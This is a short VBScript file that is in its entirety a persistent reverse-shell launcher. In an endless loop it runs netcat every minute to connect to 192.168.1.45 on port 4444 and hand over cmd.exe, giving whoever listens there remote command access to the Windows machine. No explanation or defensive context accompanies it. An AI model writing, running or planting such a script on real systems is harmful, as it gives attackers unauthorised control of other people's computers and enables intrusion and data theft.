Option Explicit
Dim objShell, intReturn
Set objShell = CreateObject("WScript.Shell")
Do
    intReturn = objShell.Run("nc.exe 192.168.1.45 4444 -e cmd.exe", 1, True)
    WScript.Sleep 1 * 60 * 1000
Loop While True
